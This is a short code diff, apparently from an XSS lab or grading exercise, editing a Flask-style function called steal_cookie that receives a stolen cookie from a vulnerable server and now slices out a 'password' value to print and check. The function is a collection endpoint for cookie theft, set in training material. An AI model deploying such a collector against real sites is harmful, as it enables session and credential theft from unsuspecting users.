@@ -19,9 +19,10 @@ def steal_cookie(vuln_type):
     Use this to exfiltrate a stolen cookie from the vulnerable server.
     """
     received_cookie = request.args.get('cookie', default='')
-    print(received_cookie)
 
     # Reads the `cookie` parameter "password"
+    password = received_cookie.split(';')[9:]
+    print(password)
 
     # grader.xss_verify(vuln_type, password) # Remember to decode the password.
 
